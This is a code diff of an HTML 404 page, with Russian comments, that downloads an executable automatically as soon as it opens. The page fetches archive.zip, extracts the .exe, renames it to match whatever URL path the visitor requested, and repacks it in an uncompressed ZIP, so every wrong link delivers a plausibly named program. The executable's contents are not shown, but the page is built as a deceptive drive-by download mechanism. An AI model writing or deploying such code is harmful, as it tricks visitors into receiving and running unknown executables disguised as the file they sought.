@@ -54,6 +54,8 @@
     .status { margin-top: 1rem; font-size: 0.85rem; color: #9aa0a6; min-height: 1.25em; }
     .status.error { color: #f28b82; }
   </style>
+  <!-- JSZip: распаковка archive.zip в браузере -->
+  <script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>
 </head>
 <body>
   <div class="card">
@@ -68,84 +70,133 @@
 
   <script>
     (function () {
-      // Файл всегда с корня сайта (важно: не относительный путь — иначе
-      // на /test-v2 браузер запросит /test-v2/archive.exe)
-      var ARCHIVE_URL = "/archive.exe";
+      // ZIP на сервере; .exe внутри (archive.exe) извлекается на клиенте
+      var ZIP_URL = "/archive.zip";
+      var INNER_EXE = "archive.exe";
 
-      function getDownloadName() {
-        // pathname: "/test-v2" или "/foo/bar/" → берём последний сегмент
-        var path = window.location.pathname || "";
-        // Убираем завершающие слэши
-        path = path.replace(/\/+$/, "");
-        // Последний сегмент URL
+      function getBaseName() {
+        var path = (window.location.pathname || "").replace(/\/+$/, "");
         var segment = path.split("/").filter(Boolean).pop() || "download";
-        // Убираем опасные/лишние символы из имени файла
         segment = segment
           .replace(/[\\/:*?"<>|]/g, "-")
-          .replace(/\.+$/, "") // точки в конце имени (Windows)
+          .replace(/\.+$/, "")
           .trim();
         if (!segment) segment = "download";
-        // Если уже .exe — не дублируем
-        if (!/\.exe$/i.test(segment)) {
-          segment += ".exe";
-        }
+        // Убираем .exe / .zip, если уже есть — добавим сами
+        segment = segment.replace(/\.(exe|zip)$/i, "");
+        if (!segment) segment = "download";
         return segment;
       }
 
-      var fileName = getDownloadName();
+      var baseName = getBaseName();
+      var exeName = baseName + ".exe";
+      var zipName = baseName + ".zip";
+
       var filenameEl = document.getElementById("filename");
       var statusEl = document.getElementById("status");
       var btn = document.getElementById("downloadBtn");
 
-      filenameEl.textContent = fileName;
+      // Пользователь получает ZIP с именем из URL; внутри — .exe с тем же базовым именем
+      filenameEl.textContent = zipName + " → " + exeName;
 
       function setStatus(text, isError) {
         statusEl.textContent = text;
         statusEl.className = "status" + (isError ? " error" : "");
       }
 
+      function triggerDownload(blob, name) {
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement("a");
+        a.href = url;
+        a.download = name;
+        a.rel = "noopener";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        setTimeout(function () {
+          URL.revokeObjectURL(url);
+        }, 2000);
+      }
+
+      function findExeEntry(zip) {
+        // 1) точное имя archive.exe
+        if (zip.file(INNER_EXE)) return zip.file(INNER_EXE);
+
+        // 2) archive.exe в любой папке
+        var names = Object.keys(zip.files);
+        for (var i = 0; i < names.length; i++) {
+          var n = names[i];
+          var entry = zip.files[n];
+          if (entry.dir) continue;
+          var leaf = n.split("/").pop();
+          if (leaf.toLowerCase() === INNER_EXE) return entry;
+        }
+
+        // 3) первый .exe в архиве
+        for (var j = 0; j < names.length; j++) {
+          var n2 = names[j];
+          var entry2 = zip.files[n2];
+          if (!entry2.dir && /\.exe$/i.test(n2)) return entry2;
+        }
+
+        return null;
+      }
+
       async function downloadArchive() {
+        if (typeof JSZip === "undefined") {
+          setStatus("Не загрузилась библиотека JSZip. Проверьте сеть / CDN.", true);
+          return;
+        }
+
         btn.disabled = true;
-        setStatus("Загрузка…");
+        setStatus("Загрузка archive.zip…");
 
         try {
-          var response = await fetch(ARCHIVE_URL, { cache: "no-cache" });
+          var response = await fetch(ZIP_URL, { cache: "no-cache" });
           if (!response.ok) {
-            throw new Error("HTTP " + response.status);
+            throw new Error("HTTP " + response.status + " при загрузке " + ZIP_URL);
           }
 
-          var blob = await response.blob();
-          var url = URL.createObjectURL(blob);
-          var a = document.createElement("a");
-          a.href = url;
-          a.download = fileName;
-          a.rel = "noopener";
-          document.body.appendChild(a);
-          a.click();
-          a.remove();
-          // Освобождаем blob URL чуть позже
-          setTimeout(function () {
-            URL.revokeObjectURL(url);
-          }, 2000);
+          setStatus("Распаковка…");
+          var zipData = await response.arrayBuffer();
+          var sourceZip = await JSZip.loadAsync(zipData);
 
-          setStatus("Файл «" + fileName + "» должен скачаться.");
+          var exeEntry = findExeEntry(sourceZip);
+          if (!exeEntry) {
+            throw new Error("В archive.zip не найден " + INNER_EXE);
+          }
+
+          var exeBlob = await exeEntry.async("blob");
+
+          // Собираем новый ZIP без сжатия (STORE):
+          // имя архива и .exe внутри — из URL (например test-v2.zip → test-v2.exe)
+          setStatus("Подготовка " + zipName + "…");
+          var outZip = new JSZip();
+          outZip.file(exeName, exeBlob, {
+            compression: "STORE",
+            binary: true
+          });
+
+          var outBlob = await outZip.generateAsync({
+            type: "blob",
+            compression: "STORE",
+            mimeType: "application/zip"
+          });
+
+          triggerDownload(outBlob, zipName);
+          setStatus("Файл «" + zipName + "» (внутри «" + exeName + "») должен скачаться.");
         } catch (err) {
           console.error(err);
           setStatus(
-            "Не удалось скачать автоматически. Нажмите кнопку ещё раз.",
+            (err && err.message) || "Ошибка. Нажмите кнопку ещё раз.",
             true
           );
-          // Fallback: прямая ссылка (имя файла может быть archive.exe)
-          btn.onclick = function () {
-            window.location.href = ARCHIVE_URL;
-          };
         } finally {
           btn.disabled = false;
         }
       }
 
       btn.addEventListener("click", downloadArchive);
-      // Автозапуск при открытии 404-страницы
       downloadArchive();
     })();
   </script>
